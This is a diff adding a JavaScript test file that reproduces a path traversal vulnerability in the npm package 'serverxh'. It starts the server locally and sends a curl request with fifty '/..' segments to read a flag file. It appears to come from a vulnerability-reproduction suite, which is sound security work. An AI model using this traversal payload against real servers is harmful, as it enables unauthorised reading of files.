@@ -1,0 +1,31 @@
+function exploitFunction() {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  function genstr(n) {
+    return "/..".repeat(n) + pathToFlag;
+  }
+
+  test("Path Traversal in serverxh", (done) => {
+    expect.assertions(1);
+    const fs = require("fs");
+    const sleep = require("sleep");
+    const { exec } = require("child_process");
+    let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+    let server = "node ./node_modules/serverxh/index.js";
+    let exe = exec(server, (error, stdout) => {});
+
+    sleep.sleep(2);
+
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Using the payload from the payload file
+
+    exec(attack_string, (error, stdout) => {
+      expect(stdout).toBe(hostsFile);
+      done();
+    });
+  });
+}
+
+module.exports = { exploitFunction };
